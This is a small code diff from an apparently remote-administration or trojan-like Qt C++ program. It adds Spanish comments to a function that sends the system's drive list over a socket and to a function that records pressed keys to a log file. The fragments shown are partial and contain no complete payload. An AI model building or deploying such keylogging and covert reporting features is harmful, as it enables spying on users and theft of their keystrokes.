@@ -474,7 +474,8 @@ void MainWindow::reiniciar(){
     QApplication::exit();
 }
 void MainWindow::listarUnidades()
-{   int i;
+{  /** Esta función envia por socket una lista de las unidades de almacenamiento del sistema **/
+    int i;
     QString unidades = "unidades|@|";
     QFileInfoList listaUnidades = directorio.drives();
     for (i=0;i<listaUnidades.size();i++){
@@ -561,6 +562,7 @@ void MainWindow::ponerMensajeChat(QString mensajeChat, QString quien)
 }
 void MainWindow::escucharTeclas()
 {
+    /** Esta función comprueba que teclas hay pulsadas y las guarda en un archivo **/
         log.open(QFile::Append);
         char num;
         #ifdef Q_WS_WIN
